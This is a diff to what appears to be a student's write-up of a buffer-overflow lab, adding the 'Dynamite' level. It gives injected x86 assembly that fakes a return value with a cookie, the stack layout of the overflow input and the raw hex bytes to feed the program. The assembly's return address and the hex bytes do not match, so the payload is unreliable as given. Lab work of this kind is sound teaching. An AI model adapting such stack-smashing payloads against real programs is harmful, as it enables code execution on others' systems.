@@ -46,3 +46,14 @@ Need to disable randomization of the kernel.
 
 ## level 3: Dynamite
 
+Attack with code:
+```
+movl $0x466f0cf1,%eax          # ret val = cookie
+push $0x08049019                # return to test
+ret
+```
+Input pattern:
+`[our code]` + `[original saved $ebp]` + `address of buf[0]`
+
+Input:
+`b8 f1 0c 6f 46 68 1e 90 04 08 c3 00 68 b5 ff ff 3c b5 ff ff`
